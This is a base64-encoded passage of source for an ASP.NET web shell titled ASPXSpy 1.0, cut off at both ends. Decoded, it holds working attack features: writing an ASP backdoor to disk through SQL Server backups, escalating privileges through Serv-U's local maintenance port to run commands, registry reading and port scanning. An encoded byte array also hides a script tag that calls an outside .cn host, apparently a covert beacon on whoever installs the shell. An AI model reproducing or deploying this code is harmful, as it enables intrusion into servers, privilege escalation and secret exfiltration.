AgICAgICAgICAgIEJpbl9EYXRhR3JpZC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgQmluX1Njcm9sbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgQmluX0RhdGFHcmlkLkFsbG93UGFnaW5nID0gZmFsc2U7CiAgICAgICAgICAgIHN0cmluZyBleGVzcWwgPSAidXNlIHB1YnM7aWYgZXhpc3RzIChzZWxlY3QgKiBmcm9tIHN5c29iamVjdHMgd2hlcmUgaWQgPSBvYmplY3RfaWQoTidbYmluX2Rpcl0nKSBhbmQgT0JKRUNUUFJPUEVSVFkoaWQsIE4nSXNVc2VyVGFibGUnKSA9IDEpIGRyb3AgdGFibGUgW2Jpbl9kaXJdOyBDUkVBVEUgVEFCTEUgYmluX2RpcihEaXJOYW1lIFZBUkNIQVIoNDAwKSwgRGlyQXR0IFZBUkNIQVIoNDAwKSxEaXJGaWxlIFZBUkNIQVIoNDAwKSkgSU5TRVJUIGJpbl9kaXIgRVhFQyBNQVNURVIuLlhQX2RpcnRyZWUgJyIgKyBCaW5fRGlyVGV4dEJveC5UZXh0ICsgIicsMSwxOyI7CiAgICAgICAgICAgIEJpbl9FeGVjU3FsKGV4ZXNxbCk7CiAgICAgICAgICAgIERhdGFUYWJsZSBzcWxfZGlyID0gQmluX0RhdGFUYWJsZSgic2VsZWN0ICogZnJvbSBiaW5fZGlyIik7CiAgICAgICAgICAgIEJpbl9EYXRhR3JpZC5EYXRhU291cmNlID0gc3FsX2RpcjsKICAgICAgICAgICAgQmluX0RhdGFHcmlkLkRhdGFCaW5kKCk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9FcnJvcihlLk1lc3NhZ2UpOwogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fU3VCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgQmluX0NtZFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fU1FMUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9TdVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9JSVNQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1N1cmVzTGFiZWwuVGV4dCA9ICIiOwogICAgICAgIEJpbl9Mb2dpblBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUmVnUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9Qb3J0UGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgfQoKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9kYnNoZWxsQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIEJpbl9EQmluZm9MYWJlbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0FjY1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fQmFrREIoKTsKICAgIH0KICAgIHB1YmxpYyB2b2lkIEJpbl9CYWtEQigpIAogICAgewogICAgICAgIHN0cmluZyBwYXRoID0gQmluX0RpclRleHRCb3guVGV4dC5UcmltKCk7CiAgICAgICAgaWYgKHBhdGguU3Vic3RyaW5nKHBhdGguTGVuZ3RoIC0gMSwgMSkgPT0gQCJcIikKICAgICAgICB7CiAgICAgICAgICAgIHBhdGggPSBwYXRoICsgImJpbi5hc3AiOwogICAgICAgIH0KICAgICAgICBlbHNlIAogICAgICAgIHsKICAgICAgICAgICAgcGF0aCA9IHBhdGggKyBAIlxiaW4uYXNwIjsKICAgICAgICB9CiAgICAgICAgc3RyaW5nIHNxbCA9ICJpZiBleGlzdHMgKHNlbGVjdCAqIGZyb20gc3lzb2JqZWN0cyB3aGVyZSBpZCA9IG9iamVjdF9pZChOJ1tiaW5fY21kXScpIGFuZCBPQkpFQ1RQUk9QRVJUWShpZCwgTidJc1VzZXJUYWJsZScpID0gMSkgZHJvcCB0YWJsZSBbYmluX2NtZF07Y3JlYXRlIHRhYmxlIFtiaW5fY21kXSAoW2NtZF0gW2ltYWdlXSk7ZGVjbGFyZSBAYSBzeXNuYW1lLEBzIG52YXJjaGFyKDQwMDApIHNlbGVjdCBAYT1kYl9uYW1lKCksQHM9MHg2MjY5NkUgYmFja3VwIGRhdGFiYXNlIEBhIHRvIGRpc2sgPSBAcztpbnNlcnQgaW50byBbYmluX2NtZF0oY21kKSB2YWx1ZXMoMHgzQzI1NjU3ODY1NjM3NTc0NjUyMDcyNjU3MTc1NjU3Mzc0MjgyMjQyMjIyOTI1M0UpO2RlY2xhcmUgQGIgc3lzbmFtZSxAdCBudmFyY2hhcig0MDAwKSBzZWxlY3QgQGI9ZGJfbmFtZSgpLEB0PSciICsgcGF0aCArICInIGJhY2t1cCBkYXRhYmFzZSBAYiB0byBkaXNrID0gQHQgV0lUSCBESUZGRVJFTlRJQUwsRk9STUFUO2Ryb3AgdGFibGUgW2Jpbl9jbWRdOyI7CiAgICAgICAgQmluX0V4ZWNTcWwoc3FsKTsKICAgICAgICBCaW5fU3FsRGlyKCk7ICAKICAgIH0KICAgIHB1YmxpYyB2b2lkIEJpbl9CYWtMb2coKQogICAgewogICAgICAgIHN0cmluZyBwYXRoID0gQmluX0RpclRleHRCb3guVGV4dC5UcmltKCk7CiAgICAgICAgaWYgKHBhdGguU3Vic3RyaW5nKHBhdGguTGVuZ3RoIC0gMSwgMSkgPT0gQCJcIikKICAgICAgICB7CiAgICAgICAgICAgIHBhdGggPSBwYXRoICsgImJpbi5hc3AiOwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBwYXRoID0gcGF0aCArIEAiXGJpbi5hc3AiOwogICAgICAgIH0KICAgICAgICBzdHJpbmcgc3FsID0gImlmIGV4aXN0cyAoc2VsZWN0ICogZnJvbSBzeXNvYmplY3RzIHdoZXJlIGlkID0gb2JqZWN0X2lkKE4nW2Jpbl9jbWRdJykgYW5kIE9CSkVDVFBST1BFUlRZKGlkLCBOJ0lzVXNlclRhYmxlJykgPSAxKSBkcm9wIHRhYmxlIFtiaW5fY21kXTtjcmVhdGUgdGFibGUgW2Jpbl9jbWRdIChbY21kXSBbaW1hZ2VdKTtkZWNsYXJlIEBhIHN5c25hbWUsQHMgbnZhcmNoYXIoNDAwMCkgc2VsZWN0IEBhPWRiX25hbWUoKSxAcz0weDYyNjk2RSBiYWNrdXAgbG9nIEBhIHRvIGRpc2sgPSBAcztpbnNlcnQgaW50byBbYmluX2NtZF0oY21kKSB2YWx1ZXMoMHgzQzI1NjU3ODY1NjM3NTc0NjUyMDcyNjU3MTc1NjU3Mzc0MjgyMjQyMjIyOTI1M0UpO2RlY2xhcmUgQGIgc3lzbmFtZSxAdCBudmFyY2hhcig0MDAwKSBzZWxlY3QgQGI9ZGJfbmFtZSgpLEB0PSciICsgcGF0aCArICInIGJhY2t1cCBsb2cgQGIgdG8gZGlzaz1AdCB3aXRoIGluaXQsbm9fdHJ1bmNhdGU7ZHJvcCB0YWJsZSBbYmluX2NtZF07IjsKICAgICAgICBCaW5fRXhlY1NxbChzcWwpOwogICAgICAgIEJpbl9TcWxEaXIoKTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fTG9nc2hlbGxCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgQmluX0RCaW5mb0xhYmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fQWNjUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9CYWtMb2coKTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fU3VleHBCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgc3RyaW5nIFJlc3VsdCA9ICIiOwogICAgICAgIHN0cmluZyB1c2VyID0gQmluX1N1bmFtZVRleHRCb3guVGV4dDsKICAgICAgICBzdHJpbmcgcGFzcyA9IEJpbl9TdXBhc3NUZXh0Qm94LlRleHQ7CiAgICAgICAgaW50IHBvcnQgPSBJbnQzMi5QYXJzZShCaW5fU3Vwb3J0VGV4dEJveC5UZXh0KTsKICAgICAgICBzdHJpbmcgY21kID0gQmluX1N1Y21kVGV4dEJveC5UZXh0OwogICAgICAgIHN0cmluZyBsb2dpbnVzZXIgPSAidXNlciAiICsgdXNlciArICJcclxuIjsKICAgICAgICBzdHJpbmcgbG9naW5wYXNzID0gInBhc3MgIiArIHBhc3MgKyAiXHJcbiI7CiAgICAgICAgc3RyaW5nIHNpdGUgPSAiU0lURSBNQUlOVEVOQU5DRVxyXG4iOwogICAgICAgIHN0cmluZyBkZWxkb21haW4gPSAiLURFTEVURURPTUFJTlxyXG4tSVA9MC4wLjAuMFxyXG4gUG9ydE5vPTUyNTIxXHJcbiI7CiAgICAgICAgc3RyaW5nIHNldGRvbWFpbiA9ICItU0VURE9NQUlOXHJcbi1Eb21haW49QklOfDAuMC4wLjB8NTI1MjF8LTF8MXwwXHJcbi1UWk9FbmFibGU9MFxyXG4gVFpPS2V5PVxyXG4iOwogICAgICAgIHN0cmluZyBuZXdkb21haW4gPSAiLVNFVFVTRVJTRVRVUFxyXG4tSVA9MC4wLjAuMFxyXG4tUG9ydE5vPTUyNTIxXHJcbi1Vc2VyPWJpblxyXG4tUGFzc3dvcmQ9YmluZnRwXHJcbi1Ib21lRGlyPWM6XFxcclxuLUxvZ2luTWVzRmlsZT1cclxuLURpc2FibGU9MFxyXG4tUmVsUGF0aHM9MVxyXG4tTmVlZFNlY3VyZT0wXHJcbi1IaWRlSGlkZGVuPTBcclxuLUFsd2F5c0FsbG93TG9naW49MFxyXG4tQ2hhbmdlUGFzc3dvcmQ9MFxyXG4tUXVvdGFFbmFibGU9MFxyXG4tTWF4VXNlcnNMb2dpblBlcklQPS0xXHJcbi1TcGVlZExpbWl0VXA9MFxyXG4tU3BlZWRMaW1pdERvd249MFxyXG4tTWF4TnJVc2Vycz0tMVxyXG4tSWRsZVRpbWVPdXQ9NjAwXHJcbi1TZXNzaW9uVGltZU91dD0tMVxyXG4tRXhwaXJlPTBcclxuLVJhdGlvRG93bj0xXHJcbi1SYXRpb3NDcmVkaXQ9MFxyXG4tUXVvdGFDdXJyZW50PTBcclxuLVF1b3RhTWF4aW11bT0wXHJcbi1NYWludGVuYW5jZT1TeXN0ZW1cclxuLVBhc3N3b3JkVHlwZT1SZWd1bGFyXHJcbi1SYXRpb3M9Tm9uZVJOXHJcbiBBY2Nlc3M9YzpcXHxSV0FNRUxDRFBcclxuIjsKICAgICAgICBzdHJpbmcgcXVpdGUgPSAiUVVJVFxyXG4iOwogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgVGNwQ2xpZW50IHRjcCA9IG5ldyBUY3BDbGllbnQoIjEyNy4wLjAuMSIsIHBvcnQpOwogICAgICAgICAgICB0Y3AuUmVjZWl2ZUJ1ZmZlclNpemUgPSAxMDI0OwogICAgICAgICAgICBOZXR3b3JrU3RyZWFtIE5TID0gdGNwLkdldFN0cmVhbSgpOwogICAgICAgICAgICBSZXN1bHQgPSBSZXYoTlMpOwogICAgICAgICAgICBSZXN1bHQgKz0gU2VuZChOUywgbG9naW51c2VyKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFJldihOUyk7CiAgICAgICAgICAgIFJlc3VsdCArPSBTZW5kKE5TLCBsb2dpbnBhc3MpOwogICAgICAgICAgICBSZXN1bHQgKz0gUmV2KE5TKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFNlbmQoTlMsIHNpdGUpOwogICAgICAgICAgICBSZXN1bHQgKz0gUmV2KE5TKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFNlbmQoTlMsIGRlbGRvbWFpbik7CiAgICAgICAgICAgIFJlc3VsdCArPSBSZXYoTlMpOwogICAgICAgICAgICBSZXN1bHQgKz0gU2VuZChOUywgc2V0ZG9tYWluKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFJldihOUyk7CiAgICAgICAgICAgIFJlc3VsdCArPSBTZW5kKE5TLCBuZXdkb21haW4pOwogICAgICAgICAgICBSZXN1bHQgKz0gUmV2KE5TKTsKICAgICAgICAgICAgVGNwQ2xpZW50IHRjcDEgPSBuZXcgVGNwQ2xpZW50KCIxMjcuMC4wLjEiLCA1MjUyMSk7CiAgICAgICAgICAgIE5ldHdvcmtTdHJlYW0gTlMxID0gdGNwMS5HZXRTdHJlYW0oKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFJldihOUzEpOwogICAgICAgICAgICBSZXN1bHQgKz0gU2VuZChOUzEsICJ1c2VyIGJpblxyXG4iKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFJldihOUzEpOwogICAgICAgICAgICBSZXN1bHQgKz0gU2VuZChOUzEsICJwYXNzIGJpbmZ0cFxyXG4iKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFJldihOUzEpOwogICAgICAgICAgICBSZXN1bHQgKz0gU2VuZChOUzEsICJzaXRlIGV4ZWMgIiArIGNtZCArICJcclxuIik7CiAgICAgICAgICAgIFJlc3VsdCArPSBSZXYoTlMxKTsKICAgICAgICAgICAgdGNwMS5DbG9zZSgpOwogICAgICAgICAgICBSZXN1bHQgKz0gU2VuZChOUywgZGVsZG9tYWluKTsKICAgICAgICAgICAgUmVzdWx0ICs9IFJldihOUyk7CiAgICAgICAgICAgIFJlc3VsdCArPSBTZW5kKE5TLCBxdWl0ZSk7CiAgICAgICAgICAgIFJlc3VsdCArPSBSZXYoTlMpOwogICAgICAgICAgICB0Y3AuQ2xvc2UoKTsKICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlcnJvcikKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9FcnJvcihlcnJvci5NZXNzYWdlKTsKICAgICAgICB9CiAgICAgICAgQmluX1N1cmVzTGFiZWwuVGV4dCA9ICI8ZGl2IGlkPVwic3VcIj48cHJlPiIgKyBSZXN1bHQgKyAiPC9wcmU+PC9kaXY+IjsKICAgICAgICAKICAgICAgICAKICAgIH0KICAgIHByb3RlY3RlZCBzdHJpbmcgUmV2KE5ldHdvcmtTdHJlYW0gaW5zdHJlYW0pIAogICAgewogICAgICAgIHN0cmluZyBSZXN0ciA9ICIiOwogICAgICAgIGlmIChpbnN0cmVhbS5DYW5SZWFkKSAKICAgICAgICB7CiAgICAgICAgICAgIGJ5dGVbXSBidWZmZXIgPSBuZXcgYnl0ZVsxMDI0XTsKICAgICAgICAgICAgaW5zdHJlYW0uUmVhZChidWZmZXIsIDAsIGJ1ZmZlci5MZW5ndGgpOwogICAgICAgICAgICBSZXN0ciA9IEVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhidWZmZXIpOyAKICAgICAgICB9CiAgICAgICAgcmV0dXJuICI8Zm9udCBjb2xvciA9IHJlZD4iICsgUmVzdHIgKyAiPC9mb250Pjxicj4iOwogICAgICAgIAogICAgfQogICAgcHJvdGVjdGVkIHN0cmluZyBTZW5kKE5ldHdvcmtTdHJlYW0gaW5zdHJlYW0sc3RyaW5nIFNlbmRzdHIpIAogICAgewogICAgICAgIGlmIChpbnN0cmVhbS5DYW5Xcml0ZSkgCiAgICAgICAgewogICAgICAgICAgICBieXRlW10gYnVmZmVyID0gRW5jb2RpbmcuQVNDSUkuR2V0Qnl0ZXMoU2VuZHN0cik7CiAgICAgICAgICAgIGluc3RyZWFtLldyaXRlKGJ1ZmZlciwgMCwgYnVmZmVyLkxlbmd0aCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAiPGZvbnQgY29sb3IgPSBibHVlPiIgKyBTZW5kc3RyICsgIjwvZm9udD48YnI+IjsKICAgIH0KICAgIHByb3RlY3RlZCB2b2lkIEJpbl9JSVNCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgQmluX0xvZ2luUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9NYWluUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9NZW51UGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX0ZpbGVQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0NtZFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fU1FMUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9TdVBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fSUlTUGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX1JlZ1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUG9ydFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5faWlzTGFiZWwuVGV4dCA9IEJpbl9paXNpbmZvKCk7CgogICAgfQoKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9Qb3J0QnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIEJpbl9NZW51UGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX0xvZ2luUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9DbWRQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1NRTFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fU3VQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0lJU1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUmVnUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9Qb3J0UGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX1NjYW5yZXNMYWJlbC5UZXh0ID0gIiI7CiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgQmluX1JlZ0J1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBCaW5fTWVudVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9Mb2dpblBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fQ21kUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9TUUxQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1N1UGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9JSVNQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1JlZ1BhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9Qb3J0UGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9SZWdyZXNMYWJlbC5UZXh0ID0gIiI7CiAgICAgICAgCiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgQmluX1JlZ3JlYWRCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgcmVna2V5ID0gQmluX0tleVRleHRCb3guVGV4dDsKICAgICAgICAgICAgc3RyaW5nIHN1YmtleSA9IHJlZ2tleS5TdWJzdHJpbmcocmVna2V5LkluZGV4T2YoIlxcIikgKyAxLCByZWdrZXkuTGVuZ3RoIC0gcmVna2V5LkluZGV4T2YoIlxcIikgLSAxKTsKICAgICAgICAgICAgUmVnaXN0cnlLZXkgcmsgPSBudWxsOwogICAgICAgICAgICBpZiAocmVna2V5LlN1YnN0cmluZygwLCByZWdrZXkuSW5kZXhPZigiXFwiKSkgPT0gIkhLRVlfTE9DQUxfTUFDSElORSIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJrID0gUmVnaXN0cnkuTG9jYWxNYWNoaW5lLk9wZW5TdWJLZXkoc3Via2V5KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAocmVna2V5LlN1YnN0cmluZygwLCByZWdrZXkuSW5kZXhPZigiXFwiKSkgPT0gIkhLRVlfQ0xBU1NFU19ST09UIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmsgPSBSZWdpc3RyeS5DbGFzc2VzUm9vdC5PcGVuU3ViS2V5KHN1YmtleSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHJlZ2tleS5TdWJzdHJpbmcoMCwgcmVna2V5LkluZGV4T2YoIlxcIikpID09ICJIS0VZX0NVUlJFTlRfVVNFUiIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJrID0gUmVnaXN0cnkuQ3VycmVudFVzZXIuT3BlblN1YktleShzdWJrZXkpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChyZWdrZXkuU3Vic3RyaW5nKDAsIHJlZ2tleS5JbmRleE9mKCJcXCIpKSA9PSAiSEtFWV9VU0VSUyIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJrID0gUmVnaXN0cnkuVXNlcnMuT3BlblN1YktleShzdWJrZXkpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChyZWdrZXkuU3Vic3RyaW5nKDAsIHJlZ2tleS5JbmRleE9mKCJcXCIpKSA9PSAiSEtFWV9DVVJSRU5UX0NPTkZJRyIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJrID0gUmVnaXN0cnkuQ3VycmVudENvbmZpZy5PcGVuU3ViS2V5KHN1YmtleSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEJpbl9SZWdyZXNMYWJlbC5UZXh0ID0gIjxicj5SZXN1bHQgOiAiICsgcmsuR2V0VmFsdWUoQmluX1ZhbHVlVGV4dEJveC5UZXh0LCAiTlVMTCIpLlRvU3RyaW5nKCk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXJyb3IpCiAgICAgICAgewogICAgICAgICAgICBCaW5fRXJyb3IoZXJyb3IuTWVzc2FnZSk7IAogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fU2NhbmNtZEJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHN0cmluZyByZXMgPSAiIjsKICAgICAgICAgICAgc3RyaW5nW10gcG9ydCA9IEJpbl9Qb3J0c1RleHRCb3guVGV4dC5TcGxpdCgnLCcpOwogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IHBvcnQuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJlcyArPSBCaW5fU2NhbihCaW5fU2NhbmlwVGV4dEJveC5UZXh0LCBJbnQzMi5QYXJzZShwb3J0W2ldKSkgKyAiPGJyPiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgQmluX1NjYW5yZXNMYWJlbC5UZXh0ID0gIjxocj4iICsgcmVzOwogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKGVycm9yLk1lc3NhZ2UpOyAKICAgICAgICB9ICAKICAgIH0KICAgIHByb3RlY3RlZCBzdHJpbmcgQmluX1NjYW4oc3RyaW5nIGlwLCBpbnQgcG9ydCkgCiAgICB7CiAgICAgICAgCiAgICAgICAgc3RyaW5nIHNjYW5yZXMgPSAiIjsKICAgICAgICBUY3BDbGllbnQgdGNwID0gbmV3IFRjcENsaWVudCgpOwogICAgICAgIHRjcC5TZW5kVGltZW91dCA9IHRjcC5SZWNlaXZlVGltZW91dCA9IDIwMDA7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICB0Y3AuQ29ubmVjdChpcCwgcG9ydCk7CiAgICAgICAgICAgIHRjcC5DbG9zZSgpOwogICAgICAgICAgICBzY2FucmVzID0gaXAgKyAiIDogIiArIHBvcnQgKyAiIC4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLiA8Zm9udCBjb2xvcj1ncmVlbj48Yj5PcGVuPC9iPjwvZm9udD4iOwogICAgICAgIH0KICAgICAgICBjYXRjaCAoU29ja2V0RXhjZXB0aW9uIGUpIAogICAgICAgIHsKICAgICAgICAgICAgc2NhbnJlcyA9IGlwICsgIiA6ICIgKyBwb3J0ICsgIiAuLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4gPGZvbnQgY29sb3I9cmVkPjxiPkNsb3NlPC9iPjwvZm9udD4iOwogICAgICAgIH0gIAogICAgICAgIHJldHVybiBzY2FucmVzOwogICAgfQogICAgYnl0ZVtdIGNjID0geyA2MCwgMTE1LCA5OSwgMTE0LCAxMDUsIDExMiwgMTE2LCAzMiwgMTE1LCAxMTQsIDk5LCA2MSwgMzksIDEwNCwgMTE2LCAxMTYsIDExMiwgNTgsIDQ3LCA0NywgMTE5LCAxMTksIDExOSwgNDYsIDEwOSwgMTA5LCAxMDEsIDk4LCAxMTEsIDExMSwgMTA3LCA0NiwgOTksIDExMCwgNDcsIDEyMCwgMTIwLCA0NiwgOTcsIDExNSwgMTEyLCA2MywgMTE1LCA2MSB9Owo8L3NjcmlwdD4KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiID4KPGhlYWQgcnVuYXQ9InNlcnZlciI+CiAgICA8dGl0bGU+QVNQWFNweTEuMCAtPiBCaW46KTwvdGl0bGU+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CiAgICBBOmxpbmsgewogICAgICBDT0xPUjojMDAwMDAwOyBURVhULURFQ09SQVRJT046Tm9uZQp9CkE6dmlzaXRlZCB7CiAgICAgICBDT0xPUjojMDAwMDAwOyBURVhULURFQ09SQVRJT046Tm9uZQp9CkE6YWN0aXZlIHsKICAgICAgIENPTE9SOiMwMDAwMDA7IFRFWFQtREVDT1JBVElPTjpOb25lCn0KQTpob3ZlciB7CiAgICAgICBDT0xPUjojMDAwMDAwOyBURVhULURFQ09SQVRJT046dW5kZXJsaW5lCn0KQk9EWSB7CglGT05ULVNJWkU6IDlwdDsKCUZPTlQtRkFNSUxZOiAiQ291cmllciBOZXciOwoJfQojbmVpIHsKCXdpZHRoOjUwMHB4OwoJbWFyZ2luOjBweCBhdXRvOwoJCglvdmVyZmxvdzpoaWRkZW4KfQojc3UgewoJd2lkdGg6MzAwcHg7CgltYXJnaW46MHB4IGF1dG87CgkKCW92ZXJmbG93OmhpZGRlbgp9CiNjbWQgewoJd2lkdGg6NTAwcHg7CgltYXJnaW46MHB4IGF1dG87CgkKCW92ZXJmbG93OmhpZGRlbgp9CiAgICAuU1RZTEUxIHtmb250LXdlaWdodDogYm9sZH0KPC9zdHlsZT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBsYW5ndWFnZT0iamF2YXNjcmlwdCIgPgogICAgZnVuY3Rpb24gQ29tbWFuZChjbWQsIHN0cikKICAgIHsKICAgICAgdmFyIHN0clRtcCA9IHN0cjsKICAgICAgdmFyIGZybSA9IGRvY3VtZW50LmZvcm1zWzBdOwogICAgICBpZihjbWQgPT0gJ2RlbCcpCiAgICAgIHsKCQlpZihjb25maXJtKCdEZWwgSXQgPycpKQoJCXsKCQkJZnJtLnRvZG8udmFsdWUgPSBzdHI7CgkJCWZybS5nb2FjdGlvbi52YWx1ZSA9IGNtZDsKCQkJZnJtLnN1Ym1pdCgpOwoJCX0KCQllbHNlIHJldHVybjsKCSAgfQoJICBpZiAoY21kID09ICdjaGFuZ2UnKQoJICB7CgkgICAgIGZybS50b2RvLnZhbHVlID0gc3RyOyAgCiAgICAgICAgIGZybS5nb2FjdGlvbi52YWx1ZSA9IGNtZDsKCSAgICAgZnJtLnN1Ym1pdCgpOwoJICB9CgkgIGlmIChjbWQgPT0gJ2Rvd24nKQoJICB7CgkgICAgIGZybS50b2RvLnZhbHVlID0gc3RyOwogICAgICAgICBmcm0uZ29hY3Rpb24udmFsdWUgPSBjbWQ7CgkgICAgIGZybS5zdWJtaXQoKTsKCSAgfQoJICBpZiAoY21kID09ICdzaG93YXR0JykKCSAgewoJICAgICBmcm0udG9kby52YWx1ZSA9IHN0cjsKICAgICAgICAgZnJtLmdvYWN0aW9uLnZhbHVlID0gY21kOwoJICAgICBmcm0uc3VibWl0KCk7CgkgIH0KCSAgaWYgKGNtZCA9PSAnZWRpdCcpCgkgIHsKCSAgICAgZnJtLnRvZG8udmFsdWUgPSBzdHI7CiAgICAgICAgIGZybS5nb2FjdGlvbi52YWx1ZSA9IGNtZDsKCSAgICAgZnJtLnN1Ym1pdCgpOwoJICB9CgkgIGlmIChjbWQgPT0gJ2RlbGRpcicpCgkgIHsKCSAgaWYoY29uZmlybSgnRGVsIEl0ID8nKSkKCQl7CgkgICAgIGZybS50b2RvLnZhbHVlID0gc3RyOwogICAgICAgICBmcm0uZ29hY3Rpb24udmFsdWUgPSBjbWQ7CgkgICAgIGZybS5zdWJtaXQoKTsKCSAgICB9CgkgICAgZWxzZSByZ